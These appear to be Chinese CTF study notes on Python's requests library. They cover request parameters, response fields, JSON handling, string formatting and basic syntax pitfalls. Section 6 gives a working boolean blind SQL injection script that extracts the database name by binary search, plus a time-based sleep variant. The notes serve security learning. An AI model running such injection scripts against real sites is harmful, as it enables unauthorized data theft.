# 02 · Python / requests（task2）

> 状态：✅ 已掌握

## 一、requests 四件套

```python
import requests

res = requests.get(url,  params={...}, headers={...}, cookies={...})   # GET
res = requests.post(url, data={...},   headers={...}, cookies={...})   # POST
```

| 参数 | 用途 | 对应 |
|---|---|---|
| `params` | URL 查询参数 | GET |
| `data` | 请求体（表单） | POST |
| `json` | 请求体（JSON） | POST（`Content-Type: application/json`） |
| `headers` | 请求头 | 改头 |
| `cookies` | Cookie | 会话 |
| `files` | 文件上传 | multipart |

**⭐ 易错**：`params`（GET） vs `data`（POST），别混。

---

## 二、响应对象

```python
res.text            # 正文（str）
res.content         # 正文（bytes）
res.headers         # 响应头（dict-like）
res.status_code     # 状态码
res.cookies         # 服务器 set 的 cookie
res.json()          # 解析 JSON → dict
res.url             # 最终 URL
res.history         # 重定向历史
```

**⭐ 抓 flag 常看 `res.headers`**（后端把 flag 放响应头）。

---

## 三、JSON ↔ Python

```python
import json

json.dumps({"a": 1})        # Python dict → JSON 字符串
json.loads('{"a":1}')       # JSON 字符串 → Python dict

requests.post(url, json={"a":1})   # 自动序列化 + 设 Content-Type
res.json()                          # 自动解析
```

**JS ↔ Python 对照**：
| JavaScript | Python (requests) |
|---|---|
| `body: JSON.stringify({...})` | `json={...}` |
| `body: new URLSearchParams({...})` | `data={...}` |
| `body: new FormData()` | `files={...}` |

---

## 四、字符串格式化

```python
name = "小明"
f"姓名：{name}"                    # f-string ⭐
"姓名：%s" % name                  # % 格式化
"姓名：{}".format(name)            # format
```

---

## 五、基础语法易错

| 点 | 说明 |
|---|---|
| **缩进** | 2空格/4空格/制表符都合法，但**不能混用** |
| **range** | `range(1,3)` = 1,2（**含头不含尾**） |
| **return** | 交付结果；不写返回 `None`（≠ print） |
| **//** （地板除） | `7//2 = 3` |
| **真值** | `0`、`""`、`[]`、`{}`、`None` 都是 **False** |
| **类型** | `"123" + 1` 报错，要 `int("123") + 1` |

---

## 六、盲注脚本模板（实战常用）

```python
import requests

url = "http://target/?id=1'"
def check(payload):
    r = requests.get(url + payload)
    return "正常特征" in r.text          # 布尔盲注：看特征

# 猜长度
length = 0
for L in range(1, 30):
    if check(" and length(database())=%d--+" % L):
        length = L; break

# 逐字符（二分）
name = ""
for pos in range(1, length + 1):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if check(" and ascii(substr(database(),%d,1))>%d--+" % (pos, mid)):
            lo = mid + 1
        else:
            hi = mid
    name += chr(lo)
print(name)

# 时间盲注版：check 里用 if(条件, sleep(5), 1)，判断耗时 > 4.5s
```

---

## 七、一句话

> **GET 用 `params=`，POST 用 `data=`（JSON 用 `json=`）**。**抓 flag 常看 `res.headers`**。**`range` 含头不含尾**。**盲注脚本核心：二分 + `ascii(substr(...))`**。
